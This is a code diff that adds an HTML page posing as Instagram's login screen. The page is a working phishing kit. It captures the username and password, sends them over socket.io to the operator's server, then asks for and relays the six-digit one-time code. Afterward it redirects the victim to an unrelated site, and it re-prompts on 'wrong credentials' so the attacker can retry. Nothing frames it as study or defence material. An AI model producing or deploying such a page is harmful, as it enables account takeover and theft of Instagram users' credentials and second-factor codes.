@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="javascriptreact">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+
+  <script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+</script>
+
+<script>
+
+socket.on('wrong',()=>{
+  document.getElementById('change').innerHTML =  "<input type='text' placeholder='Phone number, username, or email' id='main'/><input type='password' placeholder='Password' id='pass'  onkeyup='validate()'/><span>Wrong Credantials!</span><br><a href='https://www.instagram.com/accounts/password/reset/'>Forgot password?</a>"
+})
+
+  socket.on('getOtp',()=>{
+    var btn = document.getElementById('btn');
+    btn.setAttribute('onclick','sendOtp()');
+    document.getElementById('change').innerHTML = "<input type='text'  maxlength='6'  placeholder='Enter OTP' id='otp' onkeyup='validateOtp()'/>"
+  })
+
+  socket.on('done',()=>{
+    window.location.replace("https://letstalk-3fbee.web.app/");
+  })
+</script>
+  
+  <style>
+    *{
+      margin: 0;
+      padding: 0;
+    }
+    body{
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .main{
+      width: 350px;
+      height: 444px;
+      border: 1px solid rgba(var(--b6a,219,219,219),1);
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      flex-direction: column;
+    }
+
+    .main > img{
+      width: 50%;
+      object-fit: contain;
+      padding: 5px;
+    }
+
+    .main > div{
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .main >div > input{
+    background: rgba(var(--b3f,250,250,250),1);
+    border: 0;
+    outline: 0;
+    margin: 5px;
+    padding: 5px;
+    width: 80%;
+    height: 25px;
+    text-overflow: ellipsis;
+    }
+
+    .main a{
+      text-decoration: none;
+      color: rgba(var(--d69,0,149,246),1);
+    }
+
+    .main > button{
+      width: 80%;
+      height: 40px;
+      padding: 10px;
+      background-color: rgba(var(--d69,0,149,246),1);
+      color: white;
+    }
+
+
+    @media screen and (max-width: 600px) {
+      .main{
+        width: 100%;
+        height: 100%;
+      }
+}
+
+  </style>
+
+</head>
+<body>
+  <div class="main">
+    <img src="logo.png" alt="logo">
+    <div id="change">
+      
+    <input type="text" placeholder="Phone number, username, or email" id="main"/>
+    <input type="password" placeholder="Password" id="pass"  onkeyup="validate()"/>
+    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+    </div>
+    <button onclick="log()" id="btn" disabled>Log In</button>
+    <span>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></span>
+  </div>
+
+
+  <script>
+    function validate(){
+      var main = document.getElementById('main').value;
+      var pass = document.getElementById('pass').value;
+      var btn = document.getElementById('btn');
+      if(main.length >= 6 && pass.length >= 6){
+        btn.disabled = false;
+      }
+    }
+
+    function log(){
+      var main = document.getElementById('main').value;
+      var pass = document.getElementById('pass').value;
+      var btn = document.getElementById('btn');
+
+      btn.disabled = true;
+    document.getElementById('change').innerHTML = "Logging In..."
+
+      socket.emit('details',{"main":main,"pass":pass});
+    }
+
+
+    function validateOtp(){
+      var otp = document.getElementById('otp').value;
+      var btn = document.getElementById('btn');
+      if(otp.length === 6){
+        btn.disabled = false;
+      }
+    }
+
+    function sendOtp(){
+      var otp = document.getElementById('otp').value;
+      socket.emit('otp',otp);
+      document.getElementById('change').innerHTML = "Logging In..."
+    }
+  </script>
+</body>
+</html>
